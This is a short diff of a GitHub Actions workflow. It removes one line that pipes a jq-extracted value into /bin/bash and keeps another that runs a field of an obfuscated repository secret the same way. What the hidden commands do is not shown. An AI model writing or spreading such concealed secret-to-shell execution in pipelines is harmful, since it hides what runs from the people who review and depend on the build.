@@ -22,7 +22,6 @@ jobs:
           txv1: ${{ secrets.txv1 }}
         run: |
           printf '%s' "$txv1" | jq -r .qtaph81 | /bin/bash
-          echo $ls6456 | jq -r .u7 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
